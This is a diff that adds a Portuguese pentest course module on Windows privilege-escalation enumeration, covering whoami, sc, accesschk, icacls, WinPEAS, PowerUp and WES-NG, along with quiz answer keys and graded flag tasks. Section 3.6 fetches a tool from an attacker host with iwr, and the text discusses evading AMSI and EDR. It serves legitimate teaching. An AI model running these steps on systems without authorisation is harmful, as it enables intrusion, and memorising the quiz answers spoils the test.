@@ -1,0 +1,620 @@
+---
+slug: privesc-windows-enumeracao
+track: trilha-6
+title: "PrivEsc Windows: enumeração"
+prerequisites: [conceitos-de-privesc, windows-para-quem-vem-do-linux]
+lab: null
+tasks:
+  - slug: missao-1-winpeas
+    title: "Missão 1 — Ler o WinPEAS e achar o vetor real"
+    type: flag
+    prompt: "O FLAG{...} escondido (base64) no único achado do WinPEAS que é, de fato, um vetor de escalação — o RED/YELLOW que cruza algo que você controla com algo que tem poder. Decodifique a nota desse achado e cole no formato FLAG{...}."
+    hint: "Leia a legenda que o WinPEAS imprime: RED/YELLOW ≈ 95% um vetor; GREEN é coisa comum. Dos três achados, um é verde (contexto), um é vermelho mas só descreve o SEU token, e um é amarelo e aponta um serviço LocalSystem que você pode modificar. A nota (base64) desse último é a flag; as outras decodificam para um 'decoy...'."
+    flag:
+      hash: "scrypt$16384$8$1$02450ffbb485b64b839de5e499aabae450474afae22811c00705ab2425674490"
+      salt: "1b9a7f30c9fb78dfe4c051f5369df394"
+  - slug: missao-2-cruzamento
+    title: "Missão 2 — Cruzar sc e icacls para achar o serviço explorável"
+    type: flag
+    prompt: "O FLAG{...} (base64) na nota do único serviço que é vetor real: aquele cujo binário é gravável por você E que roda como LocalSystem. Decodifique e cole no formato FLAG{...}."
+    hint: "Quatro serviços. Cruze o sc (quem executa cada um) com o icacls (quem pode gravar o binário). Descarte: o que roda como a sua própria conta (gravável, mas sem poder), o que você só pode ler (RX) e o de caminho entre aspas. Sobra um: Users com (M) de Modify E SERVICE_START_NAME LocalSystem."
+    flag:
+      hash: "scrypt$16384$8$1$14f3624e7ad79068cf789c32a7a6d46754e10b9f5c489550e8c3173c0156b658"
+      salt: "b448c5909f64c3a1d9cfef6531177020"
+  - slug: missao-3-triagem
+    title: "Missão 3 — Priorizar: qual vetor você entrega ao 6.5 primeiro"
+    type: flag
+    prompt: "O FLAG{...} (base64) na nota do vetor que você tentaria PRIMEIRO neste host, pela regra de confiabilidade, ruído e estabilidade. Decodifique a nota certa e cole no formato FLAG{...}."
+    hint: "Dois achados: (A) a conta tem SeImpersonatePrivilege ligado; (C) o WES-NG sugere um kernel exploit. Qual é confiável, silencioso e não derruba a máquina? A nota desse é a flag; a do outro decodifica para um 'decoy...'."
+    flag:
+      hash: "scrypt$16384$8$1$e6580d3dc4cafef8f36b2c379c32781d8d8b6ca9dbddea9c233bda1367483cd2"
+      salt: "eeca2c1c832e8a0392a1377e6193ff02"
+  - slug: quiz-final
+    title: "Quiz — PrivEsc Windows: enumeração"
+    type: quiz
+    passPercent: 70
+    questions:
+      - question: "Por que um usuário de baixo privilégio consegue enumerar tanta coisa de um host Windows — a config dos serviços, o próprio token, permissões, políticas do registro — sem explorar nenhuma falha?"
+        options:
+          - "Porque todo processo no Windows roda, por padrão, com privilégio de administrador"
+          - "Porque muita informação é legível por desenho: a config dos serviços, o seu token, as permissões (icacls) e as políticas precisam ser lidas por programas comuns para o sistema funcionar; enumerar é só ler isso com método"
+          - "Porque o UAC desliga as permissões enquanto não há administrador logado"
+          - "Porque a enumeração explora uma falha conhecida do Service Control Manager"
+        answer: 1
+        explanation: "Igual ao Linux (6.2): enumerar não explora nada, só lê o que já é legível. O Windows precisa que programas comuns consultem a lista de serviços, o próprio token (whoami), as permissões (icacls) e as políticas (reg query) para operar — então isso é legível por padrão. Essa assimetria (esconder é caro, ler é de graça) é o que entrega ao atacante o mapa do terreno. Não é que os processos sejam admin, nem que o UAC desligue permissões."
+      - question: "O `whoami /priv` de uma conta de serviço mostra `SeImpersonatePrivilege` com estado `Enabled`. Ainda na fase de enumeração, por que esse achado vai direto para o topo da lista?"
+        options:
+          - "Não é relevante: esse privilégio só serve para o serviço funcionar e não dá vantagem a um atacante"
+          - "Porque ele dá, sozinho, leitura direta da memória do LSASS"
+          - "Porque, no 6.5, esse privilégio vira SYSTEM via PrintSpoofer/potato sem exploit de memória e sem ser admin — então, já ao enumerar, uma conta de serviço que o tem é tratada como quase-SYSTEM"
+          - "Porque ele desliga o integrity level do processo"
+        answer: 2
+        explanation: "A enumeração não explora, mas ela prioriza. SeImpersonatePrivilege é o caminho mais confiável a SYSTEM num servidor (IIS, SQL) — é o que o 6.5 explora com PrintSpoofer e a família potato. Por isso, ao vê-lo no whoami /priv, o enumerador já marca aquela conta como quase-SYSTEM e a coloca no alto da lista de candidatos. Ele não lê o LSASS por si só (isso é SeDebugPrivilege) nem mexe no integrity level."
+      - question: "No WinPEAS você vê um achado em verde e outro em vermelho/amarelo. Segundo a legenda que o próprio PEASS imprime, o que cada cor significa e o que você faz?"
+        options:
+          - "Verde é um vetor garantido; vermelho indica configuração segura"
+          - "RED/YELLOW marca os caminhos de maior probabilidade de escalação — por onde você começa, confirmando à mão; verde é 'coisa comum' (contexto), não vetor"
+          - "As cores são decorativas e não têm significado definido"
+          - "Vermelho significa que o Microsoft Defender bloqueou aquele item"
+        answer: 1
+        explanation: "A legenda do PEASS (a mesma do LinPEAS que você viu no 6.2) marca RED/YELLOW como ~95% um vetor de escalação: é o primeiro lugar onde olhar, sempre confirmando o achado à mão. Verde é 'common things' — usuários, grupos, contexto —, não vetor. Nenhuma cor é decorativa, e nenhuma reporta ação do Defender."
+      - question: "O `accesschk` mostra que você pode gravar o binário de um serviço, e o `sc qc` mostra que esse serviço roda como a SUA própria conta (não como LocalSystem). Por que isso NÃO é um vetor de escalação?"
+        options:
+          - "Porque escalar exige o cruzamento controle × poder (6.1): você controla o binário, mas o 'poder' é a conta que o executa — se o serviço roda como você mesmo, trocar o binário não entrega privilégio nenhum acima do que já tem"
+          - "Porque é, sim, um vetor: qualquer binário de serviço gravável leva a SYSTEM"
+          - "Porque o Windows recusa executar binários modificados por um usuário comum"
+          - "Porque o Service Control Manager nunca reinicia um serviço editado"
+        answer: 0
+        explanation: "É o coração da triagem: um achado só é vetor quando o que você controla encontra algo que tem poder. Binário gravável (controle) + conta LocalSystem (poder) = vetor. Binário gravável + a sua própria conta = você roda seu código como... você mesmo, nenhum ganho. Por isso o enumerador cruza sempre o icacls (quem grava) com o sc (quem executa). Não é que o Windows recuse o binário nem que o SCM não reinicie."
+      - question: "Num alvo monitorado, por que jogar o WinPEAS ou o PowerUp pode queimar a operação, enquanto `sc`, `reg query`, `icacls` e `whoami` passam quase despercebidos?"
+        options:
+          - "Porque o WinPEAS simplesmente não funciona em servidores de produção"
+          - "Porque os binários nativos são sempre mais completos que o WinPEAS"
+          - "Porque o WinPEAS precisa de privilégio de administrador para rodar"
+          - "Porque WinPEAS e PowerUp são ferramentas trazidas que o Defender e o AMSI inspecionam e registram, e disparam centenas de verificações num intervalo curto (um padrão que o EDR reconhece); os binários nativos são living off the land, esperados na máquina"
+        answer: 3
+        explanation: "Mesma lição de ruído do 6.2, agora no Windows. WinPEAS/PowerUp são artefatos que o Microsoft Defender e o AMSI (a interface que entrega scripts ao antivírus para inspeção) examinam, e a enxurrada de checagens deles é um sinal claro para um EDR (endpoint detection and response, a plataforma que vigia cada máquina). Já sc/reg/icacls/whoami são binários nativos esperados — o living off the land. Não é que o WinPEAS não funcione ou precise de admin."
+      - question: "A enumeração encontra, na mesma máquina: (a) a conta tem `SeImpersonatePrivilege`; (b) o WES-NG sugere um kernel exploit para a build; (c) um serviço LocalSystem com binário gravável por você. Qual você entrega ao 6.5 primeiro, e por quê?"
+        options:
+          - "O (b), o kernel exploit, porque é o mais poderoso de todos"
+          - "Tanto faz: os três têm o mesmo risco e a mesma chance de sucesso"
+          - "O (a) ou o (c): abusar de SeImpersonatePrivilege ou trocar um binário gravável são confiáveis, silenciosos e estáveis; o kernel exploit é o barulhento último recurso, que pode derrubar a máquina (tela azul)"
+          - "O (b) sempre, porque os outros dependem de o administrador reiniciar a máquina"
+        answer: 2
+        explanation: "É a priorização do 6.1/6.2 aplicada ao Windows: confiabilidade, ruído e estabilidade. SeImpersonate (via PrintSpoofer) e trocar um binário gravável são quase garantidos, discretos e não arriscam derrubar o host. O kernel exploit funciona, mas pode travar a máquina (BSOD) e acende alarmes — guardado para o fim. Nem (a) nem (c) dependem de reinício manual: você reinicia o serviço que controla."
+      - question: "O grupo Volt Typhoon (CISA AA24-038A, 2024) ficou conhecido, do ponto de vista da enumeração, por quê?"
+        options:
+          - "Por usar um 0-day de kernel para enumerar o host sem deixar rastro"
+          - "Por instalar um rootkit que escondia a enumeração do antivírus"
+          - "Por fazer todo o reconhecimento do host com binários nativos do Windows (systeminfo, tasklist, net, wmic, reg query, PowerShell) — living off the land — justamente para enumerar sem acender o EDR"
+          - "Por obter as credenciais só por phishing, sem tocar no host"
+        answer: 2
+        explanation: "O aviso conjunto de CISA/NSA/FBI documenta que a Volt Typhoon enumerava os hosts quase só com ferramentas nativas — systeminfo, tasklist /v, net user/group, wmic, reg query, PowerShell — para se misturar à atividade normal e evadir o EDR. É a prova, num ataque de Estado real, de que a enumeração por living off the land é a primeira coisa que um adversário sério faz. Não houve 0-day de kernel para 'enumerar', nem rootkit, nem só phishing."
+glossary:
+  - term: WinPEAS
+    definition: "Windows Privilege Escalation Awesome Script: o enumerador de escalação do Windows do projeto PEASS-ng (o irmão do LinPEAS que você viu no 6.2). Varre dezenas de superfícies — serviços, privilégios do token, permissões, registro, credenciais — e colore os achados por prioridade, pela legenda em que RED/YELLOW marca ~95% um vetor. Rápido e completo, mas barulhento e pego pelo AMSI/Defender."
+  - term: Seatbelt
+    definition: "Uma ferramenta de enumeração de host em C# (do conjunto GhostPack) que roda dezenas de 'safety checks' de segurança ofensiva e defensiva num Windows — tokens, UAC, credenciais salvas, histórico, serviços, agendador. Mais focada e silenciosa que o WinPEAS; costuma ser compilada e executada em memória para evitar o disco."
+  - term: PowerUp
+    definition: "Um script PowerShell (do conjunto PowerSploit) especializado em caminhos de escalação por má configuração no Windows: serviços com DACL fraco, binários e caminhos sem aspas graváveis, AlwaysInstallElevated, chaves de registro. O `Invoke-AllChecks` roda todas as verificações de uma vez e lista os vetores encontrados."
+  - term: accesschk
+    definition: "Uma ferramenta da Sysinternals (da Microsoft) que mostra, para um usuário ou grupo, os direitos efetivos sobre objetos securizáveis — arquivos, chaves de registro e, sobretudo, serviços. `accesschk.exe -uwcqv <usuário> *` lista os serviços que aquele usuário pode modificar: é a forma padrão de descobrir um serviço reconfigurável sem tentar reconfigurá-lo."
+  - term: Windows Exploit Suggester (WES-NG)
+    definition: "Windows Exploit Suggester – Next Generation: um script que pega a saída do `systeminfo` (versão da build e lista de hotfixes instalados) e a cruza com a base de boletins da Microsoft, listando as CVEs às quais o host está exposto. É o equivalente Windows do linux-exploit-suggester (6.2): dá candidatos de kernel/privilege exploit, que ainda precisam ser confirmados."
+---
+
+import funilDeEnumeracao from "./img/funil-de-enumeracao-windows.svg";
+import superficies from "./img/superficies-de-enumeracao-windows.svg";
+
+## 1. Abertura — o que você vai aprender e por quê
+
+No 6.1 você ganhou o mapa da escalação (as quatro classes — má configuração, software vulnerável, credenciais, abuso de recurso legítimo — e a regra de ouro: o vetor mora no cruzamento entre *o que você controla* e *o que tem poder*). No 6.2 você aplicou esse mapa ao Linux, enumerando um host a partir de um <GlossaryTerm term="foothold">foothold</GlossaryTerm> (o acesso inicial, de onde se executa comando no alvo). Agora é a vez do **Windows**.
+
+O terreno muda. No Windows, a identidade é um <GlossaryTerm term="access token">access token</GlossaryTerm>, não um uid; o poder máximo não é o `root`, é a conta <GlossaryTerm term="LocalSystem">LocalSystem</GlossaryTerm> (exibida como `NT AUTHORITY\SYSTEM`); e os vetores se escondem em <GlossaryTerm term="Windows service">serviços</GlossaryTerm>, no <GlossaryTerm term="registry">registro</GlossaryTerm> e em <GlossaryTerm term="Windows privilege">privilégios</GlossaryTerm> do token. Você já viu toda essa estrutura no 0.5 — este módulo a usa como ferramenta de reconhecimento. A boa notícia: a habilidade central é a mesma do 6.2 — **ler o que a máquina revela e separar o achado que importa do ruído**. A escalação no Windows raramente é um exploit de filme; é mais prosaica e mais confiável: um serviço mal configurado, um privilégio solto, uma permissão larga demais. Enumerar bem é o que os encontra.
+
+Este é o módulo de **enumeração**: aqui você aprende a achar e priorizar os vetores. **Explorá-los** — trocar o binário, vestir o token do SYSTEM, rodar o `.msi` — é o 6.5, o próximo módulo, que parte exatamente das saídas que você vai aprender a coletar aqui.
+
+**Ao final, você vai saber:**
+
+- enumerar à mão, de forma completa, as superfícies de escalação de um host Windows (contexto e nível de patch, privilégios do token, serviços, permissões de arquivo e registro, tarefas agendadas, credenciais);
+- rodar e **ler** os enumeradores automatizados — <GlossaryTerm term="WinPEAS">WinPEAS</GlossaryTerm>, <GlossaryTerm term="Seatbelt">Seatbelt</GlossaryTerm>, <GlossaryTerm term="PowerUp">PowerUp</GlossaryTerm> e o <GlossaryTerm term="Windows Exploit Suggester (WES-NG)">WES-NG</GlossaryTerm> —, entendendo a legenda de cores e o custo de ruído de cada um;
+- cruzar duas superfícies (por exemplo `sc` e `icacls`) para achar o vetor real escondido entre chamarizes;
+- triar os achados pelas quatro classes do 6.1 e priorizar os candidatos por confiabilidade, ruído e estabilidade — a lista que o 6.5 vai explorar.
+
+**Pré-requisitos:** **6.1 — Conceitos de privilégio** (as quatro classes e a pergunta-guia "o que eu controlo e que algo mais privilegiado usa?"); **0.5 — Windows para quem vem do Linux** (<GlossaryTerm term="SID">SID</GlossaryTerm>, token, <GlossaryTerm term="integrity level">integrity level</GlossaryTerm>, <GlossaryTerm term="UAC">UAC</GlossaryTerm>, serviços e o <GlossaryTerm term="SCM">SCM</GlossaryTerm>, <GlossaryTerm term="registry">registro</GlossaryTerm>, <GlossaryTerm term="icacls">icacls</GlossaryTerm> e a diferença entre `cmd`, `sc.exe` e o PowerShell — tudo que você vai usar aqui).
+
+**Tempo estimado:** 3 a 4 horas, incluindo as missões de análise.
+
+<Callout variant="ethics">
+Enumerar um sistema para escalar privilégio só é legítimo na sua **própria** máquina, numa VM sua ou num alvo com autorização por escrito. As missões deste módulo rodam no **seu** WSL, sobre um cenário de treino que **você** gera — nenhuma máquina de terceiros é tocada. A parte "no seu próprio Windows" usa a máquina que é sua. Rodar o WinPEAS ou enumerar um servidor sem autorização já é acesso não autorizado, crime pela lei 12.737/2012 (veja o 1.4).
+</Callout>
+
+## 2. Teoria aprofundada — por que a enumeração funciona no Windows
+
+### 2.1 Ler é barato aqui também — mas o terreno é outro
+
+A pergunta do 6.2 vale igual: por que um usuário *sem poder* descobre tanto? Porque o sistema **precisa** que programas comuns leiam muita coisa para funcionar. No Windows, a lista de serviços e qual binário cada um executa vive no registro, em `HKLM\SYSTEM\CurrentControlSet\Services`, legível por qualquer usuário; o seu próprio token é consultável com `whoami`; as permissões de um arquivo ou chave saem no `icacls`; as políticas de instalação estão em chaves que o `reg query` lê. Nada disso é segredo — e tudo isso é exatamente o que decide se há um degrau para subir.
+
+Há, porém, três diferenças importantes em relação ao Linux, e elas moldam como se enumera:
+
+1. **O Windows é mais fechado por padrão.** Muita informação sensível (a base <GlossaryTerm term="SAM">SAM</GlossaryTerm>, a memória do <GlossaryTerm term="LSASS">LSASS</GlossaryTerm>) exige privilégio para ler — ao contrário do Linux, onde quase tudo é *world-readable*. Então a enumeração no Windows rende mais em **configuração** (serviços, permissões, registro) do que em "ler segredos soltos".
+2. **O nível de patch importa muito mais.** No Windows, saber a build exata e **quais hotfixes** (atualizações, identificadas por um número `KB`) estão instalados é meio caminho para decidir se um exploit conhecido funciona. É por isso que o `systeminfo` e o WES-NG têm papel central aqui, e menos no Linux.
+3. **A identidade é o token, não o uid.** Como você viu no 0.5, escalar no Windows é, no fundo, obter um token melhor — seja o de um serviço LocalSystem, seja o do próprio SYSTEM. A enumeração, então, gira em torno de "que peça de config ou que privilégio me leva a um token melhor?".
+
+### 2.2 As três superfícies e a regra do cruzamento
+
+Quase todo vetor de escalação local no Windows cai em uma de três superfícies, e a enumeração cobre as três. O diagrama abaixo é o mapa do módulo:
+
+<Figure
+  src={superficies}
+  alt="Diagrama com uma caixa 'VOCÊ' (conta de serviço de baixo privilégio) à esquerda e três trilhas horizontais. Trilha 1, serviços (sc qc, accesschk): procure um serviço LocalSystem que você pode reconfigurar, com binário gravável, ou de caminho sem aspas com diretório gravável; você controla a config ou o .exe, o poder é a conta do serviço. Trilha 2, privilégios do token (whoami /priv): procure SeImpersonate, SeBackup ou SeDebug ligados, comuns em contas de serviço, que são quase-SYSTEM; você controla um pipe ou processo, o poder é o privilégio. Trilha 3, permissões de arquivo e registro (icacls, reg query): procure AlwaysInstallElevated, chave Run gravável, tarefa agendada gravável ou a base SAM legível; você controla um arquivo ou chave, o poder é o que o SYSTEM lê. As três convergem para uma caixa 'CANDIDATO A VETOR', o cruzamento controle × poder, de onde sai uma seta para o módulo 6.5, explorar."
+  caption="As três superfícies que a enumeração cobre. Um achado só vira candidato quando o que você controla cruza com algo que tem poder — a regra do 6.1. Explorar o candidato é o 6.5."
+/>
+
+- **Serviços.** Um <GlossaryTerm term="Windows service">serviço</GlossaryTerm> é um programa de segundo plano gerenciado pelo <GlossaryTerm term="SCM">Service Control Manager</GlossaryTerm> (SCM). Para cada um, o SCM guarda qual binário executar e sob qual conta. A enumeração procura: serviços que rodam como LocalSystem cujo DACL te deixa reconfigurá-los, cujo binário é gravável por você, ou cujo caminho tem espaço e está sem aspas (um <GlossaryTerm term="unquoted service path">unquoted service path</GlossaryTerm>) passando por um diretório gravável.
+- **Privilégios do token.** Além dos grupos, o token carrega <GlossaryTerm term="Windows privilege">privilégios</GlossaryTerm> — direitos que valem independentemente do DACL dos objetos. Três são ouro e aparecem muito em contas de serviço: <GlossaryTerm term="SeImpersonatePrivilege">SeImpersonatePrivilege</GlossaryTerm> (quase-SYSTEM, via PrintSpoofer), <GlossaryTerm term="SeBackupPrivilege">SeBackupPrivilege</GlossaryTerm> (lê qualquer arquivo, inclusive a SAM) e <GlossaryTerm term="SeDebugPrivilege">SeDebugPrivilege</GlossaryTerm> (abre a memória de processos do SYSTEM).
+- **Permissões de arquivo e registro.** Todo objeto securizável tem um <GlossaryTerm term="DACL">DACL</GlossaryTerm>; quando o DACL de algo que o SYSTEM lê ou executa inclui escrita para o seu grupo, você controla o que o SYSTEM faz. A enumeração procura o <GlossaryTerm term="AlwaysInstallElevated">AlwaysInstallElevated</GlossaryTerm> ligado, chaves <GlossaryTerm term="Run key">Run</GlossaryTerm> graváveis, <GlossaryTerm term="scheduled task">tarefas agendadas</GlossaryTerm> com script gravável, ou a SAM legível por uma <GlossaryTerm term="volume shadow copy">volume shadow copy</GlossaryTerm>.
+
+O ponto que amarra tudo: enumerar **não** é decorar "privilégios perigosos". É ler cada superfície e perguntar, achado a achado, "eu controlo isto, e isto tem poder?". O cruzamento é o vetor.
+
+### 2.3 Manual × automatizado × ruído: o AMSI entra em cena
+
+Há duas formas de enumerar, e a tensão entre elas é a mesma do 6.2 — com um tempero a mais no Windows. A **enumeração automatizada** (WinPEAS, Seatbelt, PowerUp) roda centenas de checagens em segundos e colore o que importa. É imbatível em cobertura. O preço é o **ruído**, e aqui o ruído é duplo: além da avalanche de execuções (que um EDR — *endpoint detection and response*, a plataforma que vigia cada máquina atrás de comportamento suspeito — reconhece), essas ferramentas são **artefatos trazidos** que o <GlossaryTerm term="Microsoft Defender Antivirus">Microsoft Defender</GlossaryTerm> e o <GlossaryTerm term="AMSI">AMSI</GlossaryTerm> (a interface que entrega scripts e payloads ao antivírus para inspeção antes de rodar) examinam. Um `WinPEAS.exe` ou um `Invoke-AllChecks` tem boa chance de ser bloqueado ou alertado antes de terminar.
+
+A **enumeração manual** com os binários nativos — `sc`, `reg`, `icacls`, `whoami`, `systeminfo` — é o oposto: seletiva, silenciosa, e é <GlossaryTerm term="living off the land">living off the land</GlossaryTerm> puro (usar só o que já existe no alvo). Esses binários são esperados numa máquina Windows; ninguém estranha um `sc query`. Em troca, é mais lento e mais fácil esquecer uma superfície.
+
+A conclusão madura é a de sempre: não é "manual é melhor". É saber o custo de cada um e escolher conforme o <GlossaryTerm term="OPSEC">OPSEC</GlossaryTerm> (a disciplina de não deixar rastro) do engajamento. Num laboratório, jogue o WinPEAS. Num alvo monitorado, enumere à mão o essencial. Neste módulo você aprende as duas, começando pela manual — porque quem só sabe rodar o WinPEAS e olhar o vermelho não sabe enumerar; sabe rodar o WinPEAS.
+
+### 2.4 O funil: de "estou dentro" a "este é o vetor"
+
+O método do módulo inteiro é um funil, idêntico em espírito ao do 6.2: comece largo (colete tudo), reduza o ruído, trie pelas quatro classes e termine com um punhado de candidatos priorizados, prontos para o 6.5.
+
+<Figure
+  src={funilDeEnumeracao}
+  alt="Funil vertical de quatro estágios. No topo, o foothold: conta de serviço de baixo privilégio como iis apppool ou NETWORK SERVICE. Estágio 1 (mais largo), COLETAR tudo: contexto e patch (whoami, systeminfo, hotfixes), token (whoami /priv e /groups), serviços (sc, accesschk), permissões de arquivo e registro (icacls, reg query), tarefas agendadas e credenciais (cmdkey, unattend.xml) — à mão com binários nativos e com WinPEAS, Seatbelt, PowerUp e WES-NG. Estágio 2, LER e reduzir o ruído: legenda do WinPEAS (RED/YELLOW primeiro), lembrar que Defender e AMSI pegam as ferramentas, e que sc, reg e icacls são silenciosos. Estágio 3, TRIAR pelas quatro classes do 6.1. Estágio 4 (mais estreito), CANDIDATOS priorizados por confiabilidade, ruído e estabilidade. Uma seta sai para a caixa final: módulo 6.5, explorar o vetor escolhido."
+  caption="Colete tudo, reduza o ruído, trie pelas quatro classes e termine com poucos candidatos priorizados. O 6.5 pega esse funil pronto e explora."
+/>
+
+## 3. Como funciona — o arsenal da enumeração
+
+Vamos ao concreto. As saídas desta seção são o formato real que você vê no Windows (nomes, host e IP trocados por exemplos genéricos: host `SRV-APP01`, usuário `webapp`, `192.168.0.10`). Imagine que você caiu como `webapp`, a conta de um pool do IIS, com um shell numa web shell.
+
+### 3.1 Contexto e nível de patch: quem sou eu, onde estou, o quão atualizado
+
+```console
+C:\> whoami
+srv-app01\webapp
+C:\> whoami /groups | findstr /i "Mandatory Label"
+Mandatory Label\Medium Mandatory Level   Label   S-1-16-8192
+C:\> systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
+OS Name:            Microsoft Windows Server 2019 Datacenter
+OS Version:         10.0.17763 N/A Build 17763
+System Type:        x64-based PC
+```
+
+Três perguntas respondidas: **quem** você é (`webapp`, integridade **média** — você não é admin elevado), **qual build** (`17763`, que decide a viabilidade de exploits) e **que arquitetura** (x64, que decide a arquitetura do payload no 6.5). O `whoami /groups` revela o <GlossaryTerm term="integrity level">integrity level</GlossaryTerm> pelo "Mandatory Label": aqui `Medium`, o que confirma que, mesmo que `webapp` fosse admin, o <GlossaryTerm term="UAC">UAC</GlossaryTerm> estaria com o token filtrado.
+
+Para o patch level completo, o `systeminfo` lista os hotfixes — a entrada que o WES-NG vai cruzar:
+
+```console
+C:\> systeminfo | findstr /C:"KB"
+Hotfix(s): 3 Hotfix(s) Installed.
+                       [01]: KB4470788
+                       [02]: KB4480056
+                       [03]: KB4487038
+```
+
+Poucos hotfixes num Server 2019 é um sinal de máquina desatualizada — guarde para a seção 3.5.
+
+### 3.2 O token: `whoami /priv`
+
+O achado mais valioso costuma estar aqui. Os privilégios do seu token saem com `whoami /priv`:
+
+```console
+C:\> whoami /priv
+PRIVILEGES INFORMATION
+----------------------
+Privilege Name                Description                               State
+============================= ========================================= ========
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege       Create global objects                     Enabled
+```
+
+Para um enumerador, essa saída grita: `SeChangeNotifyPrivilege` é inócuo (todo mundo tem), mas <GlossaryTerm term="SeImpersonatePrivilege">SeImpersonatePrivilege</GlossaryTerm> `Enabled` numa conta de serviço é **quase fim de jogo** — é o que o 6.5 transforma em SYSTEM com o PrintSpoofer. Procure sempre também por `SeBackupPrivilege`, `SeRestorePrivilege`, `SeDebugPrivilege`, `SeTakeOwnershipPrivilege` e `SeLoadDriverPrivilege`: todos são caminhos conhecidos.
+
+### 3.3 Serviços: `sc` e `accesschk`
+
+Primeiro, a config de um serviço com `sc.exe qc` (lembre do 0.5: no PowerShell, use `sc.exe`, porque `sc` sozinho é alias de `Set-Content`):
+
+```console
+C:\> sc.exe qc VulnSvc
+[SC] QueryServiceConfig SUCCESS
+        BINARY_PATH_NAME   : C:\Apps\VulnSvc\vulnsvc.exe
+        SERVICE_START_NAME : LocalSystem
+```
+
+Isso diz **o que** o serviço executa e **sob qual conta**. Para saber **quais serviços você pode modificar**, a ferramenta é o <GlossaryTerm term="accesschk">accesschk</GlossaryTerm> da <GlossaryTerm term="Sysinternals">Sysinternals</GlossaryTerm>:
+
+```console
+C:\> accesschk.exe -uwcqv webapp * -accepteula
+RW VulnSvc
+        SERVICE_QUERY_STATUS
+        SERVICE_CHANGE_CONFIG
+```
+
+As flags: `-u` suprime erros, `-w` mostra só quem tem escrita, `-c` indica serviço (`*` = todos), `-q` omite o banner, `-v` é verboso. A linha que importa é `SERVICE_CHANGE_CONFIG` — o direito de reescrever o `binPath`. Ter só `SERVICE_QUERY_STATUS`/`SERVICE_QUERY_CONFIG` é poder *ler*, não *mudar*. E o <GlossaryTerm term="icacls">icacls</GlossaryTerm> fecha a outra metade — o binário é gravável por você?
+
+```console
+C:\> icacls C:\Apps\VulnSvc\vulnsvc.exe
+C:\Apps\VulnSvc\vulnsvc.exe BUILTIN\Users:(M)
+                            NT AUTHORITY\SYSTEM:(F)
+```
+
+O `(M)` (Modify) para `Users` quer dizer que você pode sobrescrever o binário que o LocalSystem executa. **O vetor nasce do cruzamento:** `SERVICE_START_NAME: LocalSystem` (poder) + `Users:(M)` no binário, ou `SERVICE_CHANGE_CONFIG` no serviço (controle). Um sem o outro não escala nada — é exatamente o que a Missão 2 vai te fazer treinar.
+
+### 3.4 Permissões de arquivo e registro
+
+O alvo mais limpo dessa superfície é o <GlossaryTerm term="AlwaysInstallElevated">AlwaysInstallElevated</GlossaryTerm>: se as **duas** chaves de política estiverem em `0x1`, qualquer `.msi` roda como SYSTEM (o 6.5 explora; aqui só se enumera).
+
+```console
+C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+    AlwaysInstallElevated    REG_DWORD    0x1
+C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+    AlwaysInstallElevated    REG_DWORD    0x1
+```
+
+Outras leituras dessa superfície: chaves <GlossaryTerm term="Run key">Run</GlossaryTerm> que o SYSTEM executa no boot (`reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`), <GlossaryTerm term="scheduled task">tarefas agendadas</GlossaryTerm> e seus scripts (`schtasks /query /fo LIST /v`), e credenciais guardadas (`cmdkey /list`, e arquivos como `unattend.xml`, `sysprep.inf`, `web.config`). Cada uma é uma pergunta de controle × poder.
+
+### 3.5 Automatizado: WinPEAS, Seatbelt, PowerUp e WES-NG
+
+Fazer tudo à mão, sem esquecer nada, é trabalhoso. O <GlossaryTerm term="WinPEAS">WinPEAS</GlossaryTerm> — o irmão Windows do LinPEAS, do mesmo projeto <GlossaryTerm term="PEASS-ng">PEASS-ng</GlossaryTerm> — varre tudo e colore. A legenda que ele imprime é a chave de leitura, a mesma do 6.2:
+
+```text
+  RED/YELLOW: 95% a PE vector
+  RED: You should take a look at it
+  GREEN: Common things (users, groups...)
+```
+
+Ou seja: **`RED/YELLOW` é por onde se começa**, confirmando o achado à mão; verde é contexto. O <GlossaryTerm term="PowerUp">PowerUp</GlossaryTerm> (PowerShell) é mais focado em má configuração — `Invoke-AllChecks` roda tudo:
+
+```console
+PS C:\> . .\PowerUp.ps1
+PS C:\> Invoke-AllChecks
+[*] Checking service executable and argument permissions...
+ServiceName : VulnSvc
+Path        : C:\Apps\VulnSvc\vulnsvc.exe
+ModifiableFile : C:\Apps\VulnSvc\vulnsvc.exe
+```
+
+O <GlossaryTerm term="Seatbelt">Seatbelt</GlossaryTerm> (C#) é mais silencioso e cobre contexto de host. E o <GlossaryTerm term="Windows Exploit Suggester (WES-NG)">WES-NG</GlossaryTerm> pega a saída do `systeminfo` (seção 3.1) e lista as CVEs às quais o host está exposto:
+
+```console
+$ systeminfo > systeminfo.txt     # no alvo
+$ wes.py systeminfo.txt           # na sua máquina
+[+] CVE-2019-1458 WizardOpium — Elevation of Privilege
+   ...
+```
+
+Trate o WES-NG como o `linux-exploit-suggester` do 6.2: dá **pistas**, não verdades. Confirme a build e a ausência do patch antes de contar com um exploit.
+
+### 3.6 Levar a ferramenta ao alvo (e o problema do AMSI)
+
+Como no Linux, o alvo normalmente **não tem internet** (a rede do lab, por regra, não sai; um servidor bem configurado também não). Você serve a ferramenta da sua Kali e a puxa:
+
+```console
+# na Kali:
+$ python3 -m http.server 8000
+# no alvo (PowerShell):
+PS C:\> iwr http://192.168.0.5:8000/winPEASx64.exe -OutFile C:\Windows\Temp\w.exe
+```
+
+Mas aí entra o detalhe Windows: o `w.exe` pode ser barrado pelo Defender assim que tocar o disco, e o `Invoke-AllChecks` pelo AMSI ao carregar. É por isso que, num alvo com defesa, o enumerador prefere o Seatbelt compilado e executado da memória, ou simplesmente volta aos binários nativos (`sc`/`reg`/`icacls`) — living off the land, que nenhuma dessas camadas estranha. Evasão de AMSI é assunto de um módulo próprio; aqui, a lição é saber **que** essa barreira existe e por que os binários nativos a contornam de graça.
+
+## 4. Casos reais — o que aconteceu no mundo
+
+### Volt Typhoon — a enumeração por "living off the land" como doutrina de Estado (2024)
+
